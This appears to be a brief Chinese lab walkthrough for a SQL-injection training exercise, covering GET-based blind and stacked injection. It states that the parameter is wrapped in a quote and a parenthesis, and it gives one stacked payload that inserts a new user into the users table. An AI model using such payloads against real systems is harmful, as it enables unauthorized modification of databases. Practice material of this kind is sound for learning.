# GET-BLIND based-String-Stacked  
TAG：GET型注入、盲注、堆叠注入  
## 漏洞利用  
![less40_1](images\less40_1.png)  
本less中关闭了报错信息的回显，可以参照之前的讲解来进行参数包裹方式的判断    
![less40_2](images\less40_2.png)  
  
通过测试可知参数被单引号包裹还带有小括号  
构造添加用户的payload:```?id=1');insert into users(id,username,password) values ('19','less40','hello')--+```  
![less40_3](images\less40_3.png)  